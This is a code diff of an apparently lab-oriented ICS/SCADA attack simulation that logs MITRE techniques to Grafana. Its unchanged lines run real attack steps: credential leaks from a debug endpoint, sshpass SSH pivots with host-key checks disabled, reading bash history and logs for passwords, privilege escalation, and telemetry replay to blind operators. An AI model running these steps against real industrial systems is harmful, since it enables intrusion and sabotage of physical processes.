@@ -179,7 +179,9 @@ def _story_log(event_type: str, message: str, phase: int | None = None, details:
         tid = payload["meta"].get("mitre_technique_id", "T0000")
         tname = payload["meta"].get("mitre_technique_name", "Unknown Technique")
         tactic = payload["meta"].get("mitre_tactic", "Attack")
-        plevel = payload["meta"].get("purdue_level", "Level 2")
+        plevel = "Level 2"
+        payload["meta"]["purdue_level"] = "Level 2"
+        payload["meta"]["level"] = "Level 2"
         
         # Map short stage codes back to Grafana expected string
         kc_names = {
@@ -207,7 +209,7 @@ def _story_log(event_type: str, message: str, phase: int | None = None, details:
             "target_ip": "unknown",
             "target_service": "unknown",
             "narrative": message,
-            "value": 1
+            "value": 1.0
         }
         _influx_record_attack("security_alerts", tags, fields)
 
@@ -609,13 +611,13 @@ def phase6_lateral_movement(targets: dict):
     api_port  = targets["historian_port"]
     api_base  = f"http://{api_host}:{api_port}"
 
-    mitre("T1596", "Search Open Technical Databases", "API fuzzing to locate vulnerable endpoints", level="Level 3", tactic="Reconnaissance")
+    mitre("T1596", "Search Open Technical Databases", "API fuzzing to locate vulnerable endpoints", level="Level 2", tactic="Reconnaissance")
     info("━━ Step 1: API Endpoint fuzzing ━━")
     for path in ["/api/health", "/api/alerts", "/api/debug"]:
         cmd_label(f"curl -s -o /dev/null -w '%{{http_code}}' {api_base}{path}")
         time.sleep(0.5)
 
-    mitre("T1552.004", "Unsecured Credentials: API", "Exploiting developer debug endpoint leak", level="Level 3", tactic="Credential Access")
+    mitre("T1552.004", "Unsecured Credentials: API", "Exploiting developer debug endpoint leak", level="Level 2", tactic="Credential Access")
     info("━━ Step 2: Exploit /api/debug — CWE-215 Info Leak ━━")
     cmd_label(f"curl -s {api_base}/api/debug | python3 -m json.tool")
     
@@ -638,7 +640,7 @@ def phase6_lateral_movement(targets: dict):
     except Exception:
         scada_host = "localhost"
 
-    mitre("T0890", "Valid Accounts", "Using leaked SCADA credentials", level="Level 3", tactic="Initial Access")
+    mitre("T0890", "Valid Accounts", "Using leaked SCADA credentials", level="Level 2", tactic="Initial Access")
     info("━━ Step 3: Login as Engineer (Read-Only) ━━")
     eng_ssh = f"sshpass -p '{scada_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {scada_user}@{scada_host}"
     cmd_label(f"{eng_ssh} 'whoami'")
@@ -646,7 +648,7 @@ def phase6_lateral_movement(targets: dict):
     if "SHELL_OK" in login_out:
         result("SSH PIVOT", f"Shell obtained: {scada_user}@{scada_host} (Engineer Role)")
         
-    mitre("T0887", "System Discovery", "Enumerating SCADA environment", level="Level 3", tactic="Discovery")
+    mitre("T0887", "System Discovery", "Enumerating SCADA environment", level="Level 2", tactic="Discovery")
     info("━━ Step 4: Deception Discovery (Fake PLC) ━━")
     cmd_label(f"{eng_ssh} 'cat /etc/hosts'")
     run_cmd(f"{eng_ssh} 'cat /etc/hosts'", 5)
@@ -657,7 +659,7 @@ def phase6_lateral_movement(targets: dict):
     cmd_label(f"{eng_ssh} 'cat ~/.bash_history'")
     out_hist = run_cmd(f"{eng_ssh} 'cat ~/.bash_history'", 5)
     
-    mitre("T1005", "Data from Local System", "Finding operator credentials accidentally left in maintenance logs", level="Level 3", tactic="Discovery")
+    mitre("T1005", "Data from Local System", "Finding operator credentials accidentally left in maintenance logs", level="Level 2", tactic="Discovery")
     cmd_label(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'")
     log_out = run_cmd(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'", 5)
     
@@ -665,7 +667,7 @@ def phase6_lateral_movement(targets: dict):
     if "operator123" in log_out:
         found("Credentials discovered in maintenance log: operator / operator123")
     
-    mitre("T1078.001", "Valid Accounts: Default Accounts", "Escalating privileges to Operator role for full Modbus access", level="Level 3", tactic="Privilege Escalation")
+    mitre("T1078.001", "Valid Accounts: Default Accounts", "Escalating privileges to Operator role for full Modbus access", level="Level 2", tactic="Privilege Escalation")
     info("━━ Step 6: Privilege Escalation to Operator ━━")
     op_user = "operator"
     op_ssh = f"sshpass -p '{op_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {op_user}@{scada_host}"
@@ -710,7 +712,7 @@ def phase7_privesc(targets: dict):
 def phase8_replay(targets: dict):
     banner("PHASE 8: REPLAY ATTACK — Telemetry Spoofing")
     killchain("Actions on Objectives")
-    mitre("T0822", "Loss of View", "Replay telemetry to hide real system state", level="Level 3.5", tactic="Impact")
+    mitre("T0822", "Loss of View", "Replay telemetry to hide real system state", level="Level 2", tactic="Impact")
     
     # Use global INFLUX_URL_ATTACKER instead of hardcoded ics_historian
     endpoint = f"{INFLUX_URL_ATTACKER}/api/v2/write?org={INFLUX_ORG_ATTACKER}&bucket={INFLUX_BUCKET_ATTACKER}&precision=ns"
